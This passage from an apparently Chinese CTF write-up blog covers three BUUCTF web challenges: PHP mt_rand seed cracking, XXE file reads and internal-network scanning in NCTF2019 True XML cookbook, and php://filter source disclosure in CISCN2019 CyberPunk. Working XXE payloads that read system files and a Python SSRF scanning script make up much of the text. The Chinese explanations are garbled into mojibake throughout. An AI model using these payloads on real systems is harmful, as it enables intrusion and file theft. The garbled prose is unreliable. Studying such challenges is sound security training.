</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">]</span><span class="o">===</span><span class="nv">$str</span><span class="p">){</span><span class="nx">x</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p id=flag&gt;ÊäΩÂ•ñÔºåÂ∞±ÊòØÈÇ£‰πàÊûØÁá•‰∏îÊó†Âë≥ÔºåÁªô‰Ω†flag{xxxxxxxxx}&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p id=flag&gt;Ê≤°ÊäΩ‰∏≠Âì¶ÔºåÂÜçËØïËØïÂêß&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;check.php&#34;</span><span class="p">);</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âà©Áî®mt_randÂáΩÊï∞ÁöÑ‰º™ÈöèÊú∫Êï∞ÊºèÊ¥û</p>
<p>ÂÖàÂæóÂà∞ÁßçÂ≠ê,Áî®php_mt_seedÂ∑•ÂÖ∑ÁàÜÁßçÂ≠ê</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">str1</span><span class="o">=</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">str2</span><span class="o">=</span><span class="s1">&#39;fnAeH65lyg&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">res</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str2</span><span class="p">)):</span>  
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">str2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">str1</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">206304701</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$str_long1</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$len1</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$str</span><span class="o">.=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$str_long1</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str_long1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>       
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="nctf2019true-xml-cookbook">[NCTF2019]True XML cookbook
</h2><p>xxeÊ≥®ÂÖ•Ôºå‰ΩÜÊòØË∑üËøô‰∏™ÊØîËµõ‰πãÂâçÁöÑ‰∏ç‰∏ÄÊ†∑Ôºå‰∏çËÉΩÁõ¥Êé•ËØªflag‰∫Ü</p>
<p>ËøôÈ¢òÈúÄË¶ÅÂØπÂÜÖÁΩëÁöÑ‰∏ªÊú∫ËøõË°åÊé¢Êµã,Êàë‰ª¨ÂàÜÂà´ËØªÂèñÂÖ≥ÈîÆÊñá‰ª∂Ôºö<strong>/etc/hosts Âíå /proc/net/arpÔºö</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl"> &lt;!ENTITY abc SYSTEM &#34;file:///etc/hosts&#34;&gt;
</span></span><span class="line"><span class="cl"> ]&gt;
</span></span><span class="line"><span class="cl">&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl"> &lt;!ENTITY abc SYSTEM &#34;file:///proc/net/arp&#34;&gt;
</span></span><span class="line"><span class="cl"> ]&gt;
</span></span><span class="line"><span class="cl">&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301165632829.png"
	width="1893"
	height="778"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301165632829_hu16466583103963956935.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250301165632829_hu7030111360843140188.png 1024w"
	loading="lazy"
	
		alt="image-20250301165632829"
	
	
		class="gallery-image" 
		data-flex-grow="243"
		data-flex-basis="583px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301165654650.png"
	width="1856"
	height="764"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301165654650_hu7382025799349749608.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250301165654650_hu16733016153482679883.png 1024w"
	loading="lazy"
	
		alt="image-20250301165654650"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="583px"
	
></p>
<p>ÊâæÂà∞ip169.254.1.1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl"> &lt;!ENTITY abc SYSTEM &#34;http://169.254.1.1&#34;&gt;
</span></span><span class="line"><span class="cl"> ]&gt;
</span></span><span class="line"><span class="cl">&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>intruderÁàÜÁ†¥cÊÆµÔºåÂ∞±ÊòØipÊï∞Â≠óÊúÄÂêé‰∏Ä‰∏™</p>
<p>‰∏çÂØπÔºåËØªÂèñ/proc/net/fib_trieÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl"> &lt;!ENTITY abc SYSTEM &#34;file:///proc/net/fib_trie&#34;&gt;
</span></span><span class="line"><span class="cl"> ]&gt;
</span></span><span class="line"><span class="cl">&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301170301809.png"
	width="1882"
	height="843"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301170301809_hu17038029730314924421.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250301170301809_hu5251376535239653425.png 1024w"
	loading="lazy"
	
		alt="image-20250301170301809"
	
	
		class="gallery-image" 
		data-flex-grow="223"
		data-flex-basis="535px"
	
></p>
<p>ÂæóÂà∞10.244.166.66</p>
<p>ÂÜçÊ¨°ÁàÜÁ†¥ÔºåËøôÈáåÁöÑÁàÜÁ†¥Âª∂Êó∂Ë¶ÅËÆæÁΩÆ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301171129435.png"
	width="541"
	height="269"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301171129435_hu4137146849321971466.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250301171129435_hu4929811822535333215.png 1024w"
	loading="lazy"
	
		alt="image-20250301171129435"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="482px"
	
></p>
<p>ÁàÜÂá∫Êù•ÈïøÂ∫¶Ê≠£Â∏∏ÁöÑÂ∞±ÊòØflag</p>
<p>ÊàñËÄÖÁî®ËÑöÊú¨ÁàÜ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">res</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://a1fb5d9d-ab10-442b-9323-727c25c3fcb6.node5.buuoj.cn:81/doLogin.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">rawPayload</span><span class="o">=</span><span class="s1">&#39;&lt;?xml version=&#34;1.0&#34;?&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;!DOCTYPE user [&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;!ENTITY payload1 SYSTEM &#34;http://10.244.166.</span><span class="si">{}</span><span class="s1">&#34;&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;]&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;user&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;username&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&amp;payload1;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;/username&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;password&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;23&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;/password&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;/user&gt;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="n">rawPayload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#payload=rawPayload</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="s2">&#34;#</span><span class="si">{}</span><span class="s2"> =&gt;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">resp</span><span class="o">=</span><span class="n">res</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-ÂçéÂåóËµõÂå∫-day1-web5cyberpunk">[CISCN2019 ÂçéÂåóËµõÂå∫ Day1 Web5]CyberPunk
</h2><p>Âú®Ê∫êÁ†ÅÊúÄ‰∏ãÈù¢ÊúâÊ≥®Èáä</p>
<p>Êúâ‰∏™fileÂèÇÊï∞ÂèØ‰ª•ËØªÊñá‰ª∂</p>
<p>‰º™ÂçèËÆÆËØªÊâÄÊúâÂâçÈù¢ÁöÑphp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/convert.base64-encode/resource=index.php
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span> <span class="s1">&#39;/var/www/html/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// $file = $_GET[&#34;file&#34;];
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/phar|zip|bzip2|zlib|data|input|%00/i&#34;</span><span class="p">,</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="s1">&#39;no way!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$user_name</span><span class="p">)</span> <span class="o">||</span> <span class="nx">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span><span class="nv">$phone</span><span class="p">)){</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;no sql inject!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from `user` where `user_name`=&#39;</span><span class="si">{</span><span class="nv">$user_name</span><span class="si">}</span><span class="s2">&#39; and `phone`=&#39;</span><span class="si">{</span><span class="nv">$phone</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$fetch</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$fetch</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$fetch</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;error&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;&lt;p&gt;ÂßìÂêç:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/p&gt;&lt;p&gt;, ÁîµËØù:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/p&gt;&lt;p&gt;, Âú∞ÂùÄ:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Êú™ÊâæÂà∞ËÆ¢Âçï!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;‰ø°ÊÅØ‰∏çÂÖ®&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//var_dump($_POST);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;phone&#34;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;user_name&#34;</span><span class="p">];</span>
